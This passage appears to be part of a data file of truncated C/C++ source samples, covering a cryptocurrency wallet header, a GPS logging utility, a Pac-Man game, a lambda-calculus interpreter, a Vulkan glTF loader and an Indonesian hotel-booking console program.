\"crypto/crypto.h\"\n#include \"serialization/binary_utils.h\"\n#include \"serialization/string.h\"\n#include \"cryptonote_basic/blobdatatype.h\"\n#include \"mnemonics/electrum-words.h\"\n#include \"common/i18n.h\"\n#include \"common/util.h\"\n#include \"common/apply_permutation.h\"\n#include \"rapidjson/document.h\"\n#include \"rapidjson/writer.h\"\n#include \"rapidjson/stringbuffer.h\"\n#include \"common/json_util.h\"\n#include \"memwipe.h\"\n#include \"common/base58.h\"\n#include \"common/combinator.h\"\n#include \"common/dns_utils.h\"\n#include \"common/notify.h\"\n#include \"common/perf_timer.h\"\n#include \"ringct/rctSigs.h\"\n#include \"ringdb.h\"\n#include \"net/socks_connect.h\"\n\nextern \"C\"\n{\n#include \"crypto/keccak.h\"\n#include \"crypto/crypto-ops.h\"\n}\nusing namespace std;\nusing namespace crypto;\nusing namespace cryptonote;\n\n#undef ARQMA_DEFAULT_LOG_CATEGORY\n#define ARQMA_DEFAULT_LOG_CATEGORY \"wallet.wallet2\"\n\n// used to choose when to stop adding outputs to a tx\n#define APPROXIMATE_INPUT_BYTES 80\n\n// used to target a given block weight (additional outputs may be added on top to build fee)\n#define TX_WEIGHT_TARGET(bytes) (bytes*2/3)\n\n// arbitrary, used to generate different hashes from the same input\n#define CHACHA8_KEY_TAIL 0x8c\n#define CACHE_KEY_TAIL 0x8d\n\n#define UNSIGNED_TX_PREFIX \"KabosuPrivate unsigned tx set\\004\"\n#define SIGNED_TX_PREFIX \"KabosuPrivate signed tx set\\004\"\n#define MULTISIG_UNSIGNED_TX_PREFIX \"KabosuPrivate multisig unsigned tx set\\001\"\n\n#define RECENT_OUTPUT_RATIO (0.50) // 50% of outputs are from the recent zone\n#define RECENT_OUTPUT_DAYS (1.8) // last 1.8 day makes up the recent zone\n#define RECENT_OUTPUT_ZONE ((time_t)(RECENT_OUTPUT_DAYS * 86400))\n#define RECENT_OUTPUT_BLOCKS (RECENT_OUTPUT_DAYS * 720)\n\n#define FEE_ESTIMATE_GRACE_BLOCKS 10 // estimate fee valid for that many blocks\n\n#define SECOND_OUTPUT_RELATEDNESS_THRESHOLD 0.0f\n\n#define SUBADDRESS_LOOKAHEAD_MAJOR 50\n#define SUBADDRESS_LOOKAHEAD_MINOR 200\n\n#define KEY_IMAGE_EXPORT_FILE_MAGIC \"KabosuPrivate key image export\\003\"\n\n#define MULTISIG_EXPORT_FILE_MAGIC \"KabosuPrivate multisig export\\001\"\n\n#define OUTPUT_EXPORT_FILE_MAGIC \"KabosuPrivate output export\\004\"\n\n#define SEGREGATION_FORK_HEIGHT 9999999999999\n#define T",
    "/* Copyright (c) 2011-2015, 2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_core_log\"\n\n#include <log_util.h>\n#include <loc_log.h>\n#include <loc_core_log.h>\n#include <loc_pla.h>\n\nvoid LocPosMode::logv() const\n{\n    LOC_LOGV (\"Position mode: %s\\n  Position recurrence: %s\\n  \"\n              \"min interval: %d\\n  preferred accuracy: %d\\n  \"\n              \"preferred time: %d\\n  credentials: %s  provider: %s \\n  \"\n              \"power mode: %d\\n  tbm %d\",\n              loc_get_position_mode_name(mode),\n              loc_get_position_recurrence_name(recurrence),\n              min_interval,\n              preferred_accuracy,\n              preferred_time,\n              credentials,\n              provider,\n              powerMode,\n              timeBetweenMeasurements);\n}\n\n/* GPS status names */\nDECLARE_TBL(gps_status_name) =\n{\n    NAME_VAL( LOC_GPS_STATUS_NONE ),\n    NAME_VAL( LOC_GPS_STATUS_SESSION_BEGIN ),\n    NAME_VAL( LOC_GPS_STATUS_SESSION_END ),\n    NAME_VAL( LOC_GPS_STATUS_ENGINE_ON ),\n    NAME_VAL( LOC_GPS_STATUS_ENGINE_OFF ),\n};\n\n/* Find Android GPS status name */\nconst char* loc_get_gps_status_name(LocGpsStatusValue gps_status)\n{\n    return loc_get_name_from_val(gps_status_name_tbl, (int64_t) gps_status);\n}\n\n\n\nDECLARE_TBL(loc_eng_position_modes) =\n{\n    NAME_VAL( LOC_POSITION_MODE_STANDALONE ),\n    NAME_VAL( LOC_POSITION_MODE_MS_BASED ),\n    NAME_VAL( LOC_POSITION_MODE_MS_ASSISTED ),\n    NAME_VAL( LOC_POSITION_MODE_RESERVED_1 ),\n    NAME_VAL( LOC_POSITION_MODE_RESERVED_2 ),\n    NAME_VAL( LOC_POSITION_MODE_RESERVED_3 ),\n    NAME_VAL( LOC_POSITION_MODE_RESERVED_4 ),\n    NAME_VAL( LOC_POSITION_MODE_RESERVED_5 )\n};\n\nconst char* loc_get_position_mode_name(LocGpsPositionMode mode)\n{\n    return loc_get_name_from_val(loc_eng_position_modes_tbl, (int64_t) mode);\n}\n\n\n\nDECLARE_TBL(loc_eng_position_recurrences) =\n{\n    NAME_VAL( LOC_GPS_POSITION_RECURRENCE_PERIODIC ),\n    NAME_VAL( LOC_GPS_POSITION_RECURRENCE_SINGLE )\n};\n\nconst char* loc_get_position_recurrence_name(LocGpsPositionRecurrence recur)\n{\n    return loc_get_name_from_val(loc_eng_position_recurrences_tbl, (int64_t) recur);\n}\n\nconst char* loc_get_aiding_data_mask_names(LocGpsAidingData /*data*/)\n{\n    return NULL;\n}\n\n\nDECLARE_TBL(loc_eng_agps_types) =\n{\n    NAME_VAL( LOC_AGPS_TYPE_INVALID ),\n    NAME_VAL( LOC_AGPS_TYPE_ANY ),\n    NAME_VAL( LOC_AGPS_TYPE_SUPL ),\n    NAME_VAL( LOC_AGPS_TYPE_C2K ),\n    NAME_VAL( LOC_AGPS_TYPE_WWAN_ANY )\n};\n\nconst char* loc_get_agps_type_name(LocAGpsType type)\n{\n    return loc_get_name_from_val(loc_eng_agps_types_tbl, (int64_t) type);\n}\n\n\nDECLARE_TBL(loc_eng_ni_types) =\n{\n    NAME_VAL( LOC_GPS_NI_TYPE_VOICE ),\n    NAME_VAL( LOC_GPS_NI_TYPE_UMTS_SUPL ),\n    NAME_VAL( LOC_GPS_NI_TYPE_UMTS_CTRL_PLANE ),\n    NAME_VAL( LOC_GPS_NI_TYPE_EMERGENCY_SUPL )\n};\n\nconst char* loc_get_ni_type_name(LocGpsNiType type)\n{\n    return loc_get_name_from_val(loc_eng_ni_types_tbl, (int64_t) type);\n}\n\n\nDECLARE_TBL(loc_eng_ni_responses) =\n{\n    NAME_VAL( LOC_GPS_NI_RESPONSE_ACCEPT ),\n    NAME_VAL( LOC_GPS_NI_RESPONSE_DENY ),\n    NAME_VAL( LOC_GPS_NI_RESPONSE_DENY )\n};\n\nconst char* loc_get_ni_response_name(LocGpsUserResponseType response)\n{\n    return loc_get_name_from_val(loc_eng_ni_responses_tbl, (int64_t) response);\n}\n\n\nDECLARE_TBL(loc_eng_ni_encodings) =\n{\n    NAME_VAL( LOC_GPS_ENC_NONE ),\n    NAME_VAL( LOC_GPS_ENC_SUPL_GSM_DEFAULT ),\n    NAME_VAL( LOC_GPS_ENC_SUPL_UTF8 ),\n    NAME_VAL( LOC_GPS_ENC_SUPL_UCS2 ),",
    "#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <iostream>\n#include <utility>\n\nbool collides(const sf::CircleShape& circle, const sf::RectangleShape& rect) {\n    // Get the circle's center and radius\n    sf::Vector2f circleCenter = circle.getPosition() + sf::Vector2f(circle.getRadius(), circle.getRadius());\n    float radius = circle.getRadius();\n\n    // Get the rectangle's bounds\n    sf::FloatRect rectBounds = rect.getGlobalBounds();\n\n    // Find the closest point on the rectangle to the circle's center\n    float closestX = std::max(rectBounds.left, std::min(circleCenter.x, rectBounds.left + rectBounds.width));\n    float closestY = std::max(rectBounds.top, std::min(circleCenter.y, rectBounds.top + rectBounds.height));\n\n    // Calculate the distance between the circle's center and this closest point\n    float distanceX = circleCenter.x - closestX;\n    float distanceY = circleCenter.y - closestY;\n\n    // If the distance is less than the circle's radius, there's a collision\n    return (distanceX * distanceX + distanceY * distanceY) < (radius * radius);\n}\n\nbool collisionOccurredBetween(float pacmanRadius, sf::Vector2f pacmanPosition, const sf::RectangleShape& rect) {\n    sf::Vector2f pacmanCenter = pacmanPosition + sf::Vector2f(pacmanRadius, pacmanRadius);\n\n    // Get the rectangle's bounds\n    sf::FloatRect rectBounds = rect.getGlobalBounds();\n\n    // Find the closest point on the rectangle to the circle's center\n    float closestX = std::max(rectBounds.left, std::min(pacmanCenter.x, rectBounds.left + rectBounds.width));\n    float closestY = std::max(rectBounds.top, std::min(pacmanCenter.y, rectBounds.top + rectBounds.height));\n\n    // Calculate the distance between the circle's center and this closest point\n    float distanceX = pacmanCenter.x - closestX;\n    float distanceY = pacmanCenter.y - closestY;\n\n    // If the distance is less than the circle's radius, there's a collision\n    return (distanceX * distanceX + distanceY * distanceY) < (pacmanRadius * pacmanRadius);\n}\n\nvoid print(std::string message) {\n    std::cout << message << std::endl;\n}\n\nstd::string float_to_s(float to_convert) {\n    return std::to_string(to_convert);\n}\n\n// Compass for Level\n// \"&\"   = black space\n// \" \"   = dot\n// \"*\"   = intersection w/ dot\n// \"%\"   = intersection w/ no dot (\"*\" do have dots)\n// \"!\"   = powerpill\n// \"$\"   = intersection w/ powerpill\n// \"X\"   = ghost house\n// \"D\"   = door\n\nstd::string level[36][28] = {\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\" },\n    { \"#\", \"*\", \" \", \" \", \" \", \" \", \"*\", \" \", \" \", \" \", \" \", \" \", \"*\", \"#\", \"#\", \"*\", \" \", \" \", \" \", \" \", \" \", \"*\", \" \", \" \", \" \", \" \", \"*\", \"#\" },\n    { \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\" },\n    { \"#\", \"!\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"!\", \"#\" },\n    { \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\" },\n    { \"#\", \"*\", \" \", \" \", \" \", \" \", \"*\", \" \", \" \", \"*\", \" \", \" \", \"*\", \" \", \" \", \"*\", \" \", \" \", \"*\", \" \", \" \", \"*\", \" \", \" \", \" \", \" \", \"*\", \"#\" },\n    { \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\" },\n    { \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \" \", \"#\" },\n    { \"#\", \"*\", \" \", \" \", \" \", \" \", \"*\", \"#\", \"#\", \"*\", \" \", \" \", \"*\", \"#\", \"#\", \"*\", \" \", \" \", \"*\", \"#\", \"#\", \"*\", \" \", \" \", \" \", \" \", \"*\", \"#\" },\n    { \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"&\", \"#\", \"#\", \"&\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"&\", \"#\", \"#\", \"&\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"#\", \" \", \"#\", \"#\", \"%\", \"&\", \"&\", \"%\", \"&\", \"B\", \"%\", \"&\", \"&\", \"%\", \"#\", \"#\", \" \", \"#\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"#\", \" \", \"#\", \"#\", \"&\", \"#\", \"#\", \"#\", \"D\", \"D\", \"#\", \"#\", \"#\", \"&\", \"#\", \"#\", \" \", \"#\", \"&\", \"&\", \"&\", \"&\", \"&\" },\n    { \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \" \", \"#\", \"#\", \"&\", \"#\", \"X\", \"X\", \"X\", \"X\", \"X\", \"X\", \"#\", \"&\", \"#\", \"#\", \" \", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\" },\n    { \"&\", \"&\", \"&\", \"&\", \"&\", \"&\", \"*\"",
    "#include \"lambda.h\"\n\n#include <ctime>\n#include <functional>\n\nnamespace lambda {\n\n  template <typename T>\n  static auto operator+(\n    std::set<T>& a,\n    std::set<T>& b\n  ) -> std::set<T> {\n    auto result = a;\n    result.insert(b.begin(), b.end());\n    return result;\n  }\n\n  template <template<typename...> typename Container, typename T, typename... Ts>\n  static bool has(Container<T, Ts...>& container, T& element) {\n    return container.count(element) > 0;\n  }\n\n  static auto index_to_string(unsigned index) -> std::string {\n    constexpr unsigned LETTER_N = 26;\n    auto result = std::string(\"\");\n\n    for (; index >= LETTER_N; index /= LETTER_N) {\n      result += 'a' + index % LETTER_N;\n    }\n    result += 'a' + index % LETTER_N;\n\n    return result;\n  }\n\n  static bool is_number(std::string s) {\n    for (auto ch: s) {\n      if (ch < '0' || ch > '9') { return false; }\n    }\n    return true;\n  }\n\n\n\n  ComputationalPriority remove_lazy(ComputationalPriority computational_priority) {\n    return computational_priority == ComputationalPriority::Lazy\n      ? ComputationalPriority::Neutral\n      : computational_priority\n    ;\n  }\n\n\n  auto Expression::get_free_variables() -> std::set<std::string>& {\n    return free_variables;\n  }\n\n  void Expression::set_computational_priority(\n    ComputationalPriority computational_priority\n  ) {\n    computational_priority_flag = computational_priority;\n  }\n\n\n  Variable::Variable(\n    std::string literal, \n    ComputationalPriority computational_priority\n  ) : literal(literal) {\n    free_variables = { literal };\n    computational_priority_flag = computational_priority;\n  }\n\n  void Variable::delete_instance() {\n    delete this;\n  }\n\n  bool Variable::operator==(Variable& right) {\n    return literal == right.literal;\n  }\n  bool Variable::operator==(Variable&& right) {\n    return literal == right.literal;\n  }\n\n  auto Variable::get_literal() -> std::string& { return literal; }\n\n  auto Variable::reduce(\n    std::map<std::string, Expression*>& symbol_table,\n    std::multiset<std::string>& bound_variables\n  ) -> std::pair<Expression*, ReduceType> {\n    computational_priority_flag = remove_lazy(computational_priority_flag);\n\n    if (is_number(literal)) {\n      auto new_expr = generate_church_number(atoi(literal.c_str()));\n      new_expr->set_computational_priority(computational_priority_flag);\n      delete this;\n      return { new_expr, ReduceType::Delta };\n    }\n\n    if (!has(bound_variables, literal) && has(symbol_table, literal)) {\n      auto new_expr = symbol_table.find(literal)->second->clone(computational_priority_flag);\n      delete this;\n      return { new_expr, ReduceType::Delta };\n    }\n\n    computational_priority_flag = ComputationalPriority::Neutral;\n    return { this, ReduceType::Null };\n  }\n\n  auto Variable::replace(\n    Variable& variable,\n    Expression& expression,\n    std::multiset<std::string>& bound_variables\n  ) -> std::pair<Expression*, ReduceType> {\n    if (*this == variable) {\n      auto new_expr = expression.clone(computational_priority_flag);\n      delete this;\n      return { new_expr, ReduceType::Beta };\n    }\n\n    return { this, ReduceType::Null };\n  }\n\n  auto Variable::apply(\n    Expression& expression,\n    std::multiset<std::string>& bound_variables\n  ) -> std::pair<Expression*, ReduceType> {\n    return { this, ReduceType::Null };\n  }\n\n  auto Variable::to_string() -> std::string {\n    return literal;\n  }\n\n  auto Variable::get_priority() -> Priority {\n    return Priority::Variable;\n  }\n\n  auto Variable::clone() -> Expression* {\n    return new Variable(\n      literal,\n      computational_priority_flag\n    );\n  }\n  auto Variable::clone(\n    ComputationalPriority new_computational_priority\n  ) -> Expression* {\n    return new Variable(\n      literal,\n      new_computational_priority\n    );\n  }\n  \n  bool Variable::is_eager(\n    std::multiset<std::string>& bound_variables\n  ) {\n    return \n      !is_number(literal)\n      && !has(bound_variables, literal) \n      && computational_priority_flag == ComputationalPriority::Eager\n    ;\n  }\n\n  bool Variable::is_lazy() {\n    return computational_priority_flag == ComputationalPriority::Lazy;\n  }\n\n\n  Abstraction::Abstraction(\n    Variable binder,\n    Expression* body,\n    ComputationalPriority computational_priority\n  ): binder(binder), body(body) {\n    free_variables = this->body->get_free_variables();\n    free_variables.erase(this->binder.get_literal());\n    computational_priority_flag = computational_priority;\n  }\n\n  Abstraction* Abstraction::get_instance(\n    Variable binder,\n    Expression *body,\n    ComputationalPriority computational_priority\n  ) {\n    return new Abstraction(binder, body, computational_priority);\n  }\n\n  void Abstraction::delete_instance() {\n    body->delete_instance();\n    delete this;\n  }\n\n  auto Abstraction::alpha_reduce(\n    Variable to\n  ) -> Abstraction* {\n    // empty, alpha reduce do not care and should not care bound variables\n    std::multiset<std::string> bound_variables;\n    auto new_expr = Abstrac",
    "//\n// Created by allos on 2/10/2024.\n//\n\n#define GLM_ENABLE_EXPERIMENTAL\n#include \"VkLoader.h\"\n\n#include <stb_image.h>\n#include \"VkEngine.h\"\n#include \"VkInitializers.h\"\n#include \"VkTypes.h\"\n\n\nnamespace VkLoader {\n\n    std::optional<std::vector<std::shared_ptr<MeshAsset>>> loadGltfMeshes(VulkanEngine* engine, std::filesystem::path filePath) {\n        spdlog::info(\"Loading gltf: {}\", filePath.string());\n\n        fastgltf::GltfDataBuffer data;\n        data.loadFromFile(filePath);\n\n        constexpr auto gltfOptions = fastgltf::Options::LoadGLBBuffers | fastgltf::Options::LoadExternalBuffers;\n\n        fastgltf::Asset gltf;\n        fastgltf::Parser parser{};\n\n        auto load = parser.loadGltfBinary(&data, filePath.parent_path(), gltfOptions);\n\n        if (load) {\n            gltf = std::move(load.get());\n        } else {\n            spdlog::error(\"Failed to load gltf: {}\", fastgltf::to_underlying(load.error()));\n            return {};\n        }\n\n        std::vector<std::shared_ptr<MeshAsset>> meshes;\n\n        // use the same vector for all meshes so that mem doenst reallocate as often.\n        std::vector<uint32_t> indices;\n        std::vector<Vertex> vertices;\n\n        for (fastgltf::Mesh& mesh : gltf.meshes) {\n            MeshAsset newMesh;\n\n            newMesh.name = mesh.name;\n\n            //clear the mesh arratys.\n            indices.clear();\n            vertices.clear();\n\n            for (auto&& p : mesh.primitives) {\n                GeoSurface newSurface;\n                newSurface.startIndex = (uint32_t) indices.size();\n                newSurface.count = (uint32_t)gltf.accessors[p.indicesAccessor.value()].count;\n\n                size_t initial_vtx = vertices.size();\n\n                //load indexes\n                {\n                    fastgltf::Accessor& indexAccessor = gltf.accessors[p.indicesAccessor.value()];\n\n                    indices.reserve(indices.size() + indexAccessor.count);\n\n                    fastgltf::iterateAccessor<std::uint32_t>(gltf, indexAccessor, [&](std::uint32_t idx) {\n                        indices.push_back(idx + initial_vtx);\n                    });\n                }\n\n                //load vertex positions\n                {\n                    fastgltf::Accessor& posAccessor = gltf.accessors[p.findAttribute(\"POSITION\")->second];\n                    vertices.resize(vertices.size() + posAccessor.count);\n\n                    fastgltf::iterateAccessorWithIndex<glm::vec3>(gltf, posAccessor, [&](glm::vec3 v, size_t index) {\n                       Vertex newvtx;\n                       newvtx.position = v;\n                       newvtx.normal = { 1, 0, 0};\n                       newvtx.color = glm::vec4{ 1.f };\n                       newvtx.uv_x = 0;\n                       newvtx.uv_y = 0;\n                       vertices[initial_vtx + index] = newvtx;\n                    });\n                }\n\n                //load vertex normals\n                auto normals = p.findAttribute(\"NORMAL\");\n                if (normals != p.attributes.end()) {\n\n                    fastgltf::iterateAccessorWithIndex<glm::vec3>(gltf, gltf.accessors[(*normals).second], [&](glm::vec3 v, size_t index) {\n                       vertices[initial_vtx + index].normal = v;\n                    });\n                }\n\n                auto uv = p.findAttribute(\"TEXCOORD_0\");\n                if (uv != p.attributes.end()) {\n\n                    fastgltf::iterateAccessorWithIndex<glm::vec2>(gltf, gltf.accessors[(*uv).second],\n                                                                  [&](glm::vec2 v, size_t index) {\n                            vertices[initial_vtx + index].uv_x = v.x;\n                            vertices[initial_vtx + index].uv_y = v.y;\n                    });\n                }\n\n                auto colors = p.findAttribute(\"COLOR_0\");\n                if (colors != p.attributes.end()) {\n\n                    fastgltf::iterateAccessorWithIndex<glm::vec4>(gltf, gltf.accessors[(*colors).second], [&](glm::vec4 v, size_t index) {\n                            vertices[initial_vtx + index].color = v;\n                    });\n                }\n                newMesh.surfaces.push_back(newSurface);\n            }\n\n            //display the vertex normals\n\n            constexpr bool OverrideColors = true;\n\n            if (OverrideColors) {\n                for (Vertex& vtx : vertices) {\n                    vtx.color = glm::vec4(vtx.normal, 1.f);\n                }\n            }\n\n            newMesh.meshBuffers = engine->uploadMesh(indices, vertices);\n\n\n            meshes.emplace_back(std::make_shared<MeshAsset>(std::move(newMesh)));\n        }\n\n        return meshes;\n    }\n\n    std::optional<std::shared_ptr<LoadedGLTF>> loadGltf(VulkanEngine *engine, std::string_view filePath) {\n        spdlog::info(\"Loading GLTF: {}\", filePath);\n\n        std::shared_ptr<LoadedGLTF> scene = std::make_shared<LoadedGLTF>();\n        scene->creator = engine;\n        LoadedGLTF& file = *scene.get();\n\n        fastgltf::Parser parser {",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <cctype>\n#include <vector>\n\nusing namespace std;\n\nchar ulang='y',ulng='y';\n\nstruct dataTanggal {\n    int tanggal, bulan, tahun;\n};\n\nstruct dataCheckIn {\n    string nama, tipe, CS, responsibility;\n    long long NIK;\n    int NomorKamar, bed, jumlahKamar;\n    dataTanggal tanggalCheckIn;\n};\n\nstruct Room {\n    string tipe;\n    int availability;\n};\n\nstruct FasilitasKolamRenang {\n    string nama;\n    int hargaPerJam;\n    bool hasPelampung;\n    int hargaPelampung;\n};\n\nstruct MenuItem {\n    string nama;\n    int harga;\n};\n\nclass Menu {\npublic:\n    void addItem(const MenuItem& item) {\n        items.push_back(item);\n    }\n\n    void displayMenu() {\n        cout << \"Menu Makanan dan Minuman:\\n\";\n        for (size_t i = 0; i < items.size(); ++i) {\n            cout << i + 1 << \". \" << items[i].nama << \" - Rp. \" << items[i].harga << \"\\n\";\n        }\n    }\n\n    int selectItems() {\n        int pilihan, jumlah, totalHarga = 0;\n        while (true) {\n            cout << \"Masukkan nomor item (0 untuk selesai): \";\n            cin >> pilihan;\n            if (pilihan == 0) break;\n            if (pilihan > 0 && pilihan <= items.size()) {\n                cout << \"Masukkan jumlah: \";\n                cin >> jumlah;\n                totalHarga += items[pilihan - 1].harga * jumlah;\n            } else {\n                cout << \"Pilihan tidak valid.\\n\";\n            }\n        }\n        return totalHarga;\n    }\n\nprivate:\n    vector<MenuItem> items;\n};\n\nvoid CustomerServiceInput() {\n    ifstream file(\"CustomerService_Data.txt\");\n    string nomorCS, nomorCSReal, namaCS;\n\n    cout << \"Masukkan ID Customer Service yang Aktif (Anda) : \";\n    cin >> nomorCS;\n    if(nomorCS==\"quit\"){\n        ulang='n';ulng='n';\n    }\n    bool found = false;\n    while (file >> nomorCSReal >> namaCS) {\n        if (nomorCSReal == nomorCS) {\n            system(\"cls\");\n            cout << \"Nama : \" << namaCS << \"\\nKode : \" << nomorCSReal << endl << endl;\n            found = true;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Nomor Customer Service Anda tidak terdaftar\";\n        exit (1);\n    }\n    file.close();\n}\n\nvoid CetakKeteranganKamar(char kodeKamar) {\n    string fileData_Kamar;\n    if (tolower(kodeKamar) == 'd')\n        fileData_Kamar = \"Deluxe_F_R.txt\";\n    else if (tolower(kodeKamar) == 's')\n        fileData_Kamar = \"Superior_F_R copy.txt\";\n    else if (tolower(kodeKamar) == 'r')\n        fileData_Kamar = \"Reguler_F_R copy.txt\";\n    else {\n        cout << \"Maaf kode kamar Anda tidak terdaftar\" << endl;\n        return;\n    }\n\n    system (\"cls\");\n    ifstream file(fileData_Kamar);\n    if (file) {\n        stringstream buffer;\n        buffer << file.rdbuf();\n        cout << buffer.str() << endl;\n    } else {\n        cout << \"File kamar tidak ditemukan\" << endl;\n    }\n    file.close();\n}\n\nvoid PilihKolamRenang() {\n    system(\"cls\");\n    vector<FasilitasKolamRenang> fasilitas = {\n        {\"Kolam Renang Reguler (Outdoor)\", 85000, true, 15000},\n        {\"Kolam Renang Anak (Outdoor)\", 55000, true, 10000},\n        {\"Kolam Renang VIP (Indoor)\", 112000, true, 20000}\n    };\n\n    cout << \"Pilih fasilitas kolam renang:\\n\";\n    for (size_t i = 0; i < fasilitas.size(); ++i) {\n        cout << i + 1 << \". \" << fasilitas[i].nama << \" - Rp. \" << fasilitas[i].hargaPerJam << \"/jam\\n\";\n    }\n\n    int pilihan, jumlah_orang;\n    float jam;\n    cout << \"Masukkan pilihan Anda (1-\" << fasilitas.size() << \"): \";\n    cin >> pilihan;\n\n    cout << \"Masukkan jumlah orang: \";\n    cin >> jumlah_orang;\n\n    cout << \"Masukkan total jam yang diinginkan: \";\n    cin >> jam;\n\n    if (pilihan >= 1 && pilihan <= fasilitas.size()) {\n        int totalHargaKolam = fasilitas[pilihan - 1].hargaPerJam * jam * jumlah_orang;\n\n        bool inginPelampung = false;\n        int totalHargaPelampung = 0;\n\n        cout << endl;\n        cout << \"Harga extra perlengkapan berenang\\n\";\n        cout << \"1. Pelampung Reguler      = Rp. 15.000\" << endl;\n        cout << \"2. Pelampung Anak         = Rp. 10.000\" << endl;\n        cout << \"3. Pelampung (khusus VIP) = Rp. 20.000\" << endl;\n\n        if (fasilitas[pilihan - 1].hasPelampung) {\n            char pelampungPilihan;\n            cout << \"Apakah Anda ingin menggunakan pelampung? (y/n): \";\n            cin >> pelampungPilihan;\n            inginPelampung = (tolower(pelampungPilihan) == 'y') ? true : false;\n\n            if (inginPelampung) {\n                totalHargaPelampung = fasilitas[pilihan - 1].hargaPelampung * jumlah_orang;\n            }\n        }\n\n        int totalHarga = totalHargaKolam + totalHargaPelampung;\n\n        ofstream file(\"kolamrenang.txt\", ios::app);\n        file << \"Fasilitas Kolam Renang: \" << fasilitas[pilihan - 1].nama << \"\\n\";\n        file << \"Jumlah Jam: \" << jam << \"\\n\";\n        file << \"Jumlah Orang: \" << jumlah_orang << \"\\n\";\n        file << \"Biaya Kolam Renang: Rp. \" << totalHargaKolam << \"\\n\";\n        if (inginPelampung) {\n            file << \"M",
